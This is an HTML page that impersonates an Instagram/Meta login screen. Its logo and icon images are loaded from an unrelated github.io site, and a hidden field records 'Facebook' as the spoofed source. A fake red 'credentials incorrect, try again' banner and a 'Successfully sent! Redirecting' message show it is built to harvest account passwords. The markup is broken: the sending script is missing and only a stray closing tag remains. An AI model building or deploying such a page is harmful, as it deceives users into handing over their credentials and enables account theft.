<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 90vh;
    }

    .container {
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .language-selector {
      font-size: 14px;
      color: #444;
      margin-bottom: 30px;
      position: relative;
      bottom: 75px;
    }

    .logo {
      width: 70px;
      margin-bottom: 30px;
      position: relative;
      bottom: 50px;
    }

    .login-form {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 15px;
    }

    .login-form input {
      padding: 15px;
      border: 1px solid #ccc;
      border-radius: 15px;
      font-size: 15px;
    }

    .login-btn {
      background-color: #1877F2;
      color: #fff;
      border: none;
      border-radius: 30px;
      padding: 14px;
      font-size: 16px;
      cursor: pointer;
    }

    .forgot-password {
      display: block;
      margin: 15px 0 30px;
      color: #262626;
      text-decoration: none;
      font-size: 14px;
    }

    .create-btn {
      border: 1px solid #1877F2;
      width: 90%;
      background-color: #fff;
      color: #1877F2;
      padding: 14px;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
      position: relative;
      top: 120px;
    }

    .meta-logo {
      margin-top: 20px;
      font-size: 18px;
      color: #444;
      font-weight: 500;
      position: relative;
      top: 110px;
    }
    
    .dwn {
      width: 20px;
      position: relative;
      top: 6px;
    }
    
    .meta {
      width: 70px;
    }

    #successMessage {
      display: none;
      background-color: red;
      color: white;
      text-align: center;
      padding: 10px;
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 1000;
    }
        
    input:focus,
    button:focus {
      outline: none;
    }
  </style>
</head>
<body>
  <!-- Error banner -->
  <div id="successMessage">
    The credentials details that you entered is incorrect, but we can help you get back into your account. 
    <strong>Try again with different log</strong>
  </div>

  <div class="container">
    <div class="language-selector">
      English (US) <img src="https://ranky10.github.io/Pi/dwn.png" alt="" class="dwn">
    </div>
    <img src="https://ranky10.github.io/Pi/facebook.png" alt="Instagram Logo" class="logo" />

    <form id="loginForm" class="login-form">
      <input id="username" type="text" placeholder="Username, email or mobile number" required />
      <input id="password" type="password" placeholder="Password" required />
      <input type="hidden" name="source_page" id="sourcePage" value="Facebook" />
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <a href="#" class="forgot-password">Forgot password?</a>
    <button class="create-btn">Create new account</button>
    <div class="meta-logo">
      <img src="https://ranky10.github.io/Pi/meta.png" alt="" class="meta">
    </div>

    <!-- Success message -->
    <div id="successMessage" style="display:none; margin-top:20px; color:green;">
      Successfully sent! Redirectingâ€¦

  </div>

  </script>
</body>
</html>
